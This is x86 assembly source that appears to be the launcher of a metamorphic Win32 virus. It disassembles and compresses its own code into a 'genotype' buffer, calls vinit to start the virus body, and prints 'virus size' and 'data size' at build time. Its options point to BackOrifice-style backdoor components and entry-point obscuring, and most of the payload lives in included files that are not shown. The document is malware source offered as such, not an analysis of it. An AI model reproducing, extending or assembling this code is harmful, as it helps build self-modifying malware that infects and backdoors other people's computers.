.586p
.model flat, stdcall
locals

.xlist
include pe.i
include mz.i
include useful.i
include win32api.i
include jmps386.i
include socket.i
.list

       ofs equ offset
       by  equ byte ptr
       wo  equ word ptr
       dwo equ dword ptr
       fwo equ fword ptr

       TRUE  EQU 1
       FALSE EQU 0


FIXED_BO_PSW EQU TRUE
BO_THREADS   EQU 0
DISKSEARCH   EQU FALSE
EPO          EQU FALSE
MUAZZINS     EQU FALSE


include lexo32.i
include bo.i


_HOST  segment dword use32 public 'MAIN'

include main.asi

_HOST  ends



_DDATA segment dword use32 public 'DDATA'

include data.asi

_DDATA ends



_GENS  segment dword use32 public 'GENOTYPE'

gens   db 60*1024 dup (?)

_GENS  ends



_INIT  segment dword use32 public 'INIT'

main   PROC
  LOCAL previous_offset

       mov esi, 401000h
       mov [previous_offset], esi
       mov edi, ofs gens+16*1024
  @@disasm:
       cmp esi, ofs vend
       je @@done

       cmp dwo [esi], 565604ebh
       jne @@no_meta_flag
       lodsd
       lodsw
       push eax
       mov eax,-2
       stosw
       pop eax
       bts eax, 15
       stosw
       jmp @@disasm
  @@no_meta_flag:

       call disasm
       jc @@error

       mov eax,esi
       sub eax,[previous_offset]
       stosw
       mov [previous_offset],esi
       add esi, [disasm_size]
       jmp @@disasm
  @@done:
       mov eax,-1
       stosd

       sub edi,ofs gens+16*1024
       mov ecx,edi

       mov esi, ofs gens+16*1024
       mov edi, ofs gens
       call z_encode_asm

       call vinit

  _exit:
       push -1
       call [_Sleep]

  @@error:
       db 0cch
       jmp @@error
main   ENDP

_GMH dd ofs __GMH

__GMH PROC
       mov eax, 0bff70000h
       ret 4
__GMH ENDP

Debug_Output PROC
       pop eax
       call @@delta
  @@delta:
       pop ebp
       mov [ebp+(ofs @@jmp-ofs @@delta)], eax
       push ofs debug_buffer
       call [_wsprintfA]
       pop esi

       push 0
       call @@1
       dd 0
  @@1:
       call [_lstrlenA], esi
       push eax
       push esi
       call [_GetStdHandle], -11
       push eax
       call [_WriteFile]

       push 12345678h
     org $-4
  @@jmp dd 0
       ret
Debug_Output ENDP

vir_size equ ofs vend-ofs vinit

db 13,10
db 13,10
db '------------------------------------',13,10

db 'virus size = '
db vir_size/10000 mod 10 + '0'
db vir_size/ 1000 mod 10 + '0'
db vir_size/  100 mod 10 + '0'
db vir_size/   10 mod 10 + '0'
db vir_size/    1 mod 10 + '0',13,10

db 'data size = '
db data_size/10000 mod 10 + '0'
db data_size/ 1000 mod 10 + '0'
db data_size/  100 mod 10 + '0'
db data_size/   10 mod 10 + '0'
db data_size/    1 mod 10 + '0',13,10

db '------------------------------------',13,10
db 13,10
db 13,10

debug_buffer db 256 dup (0)

_INIT  ends


end    main
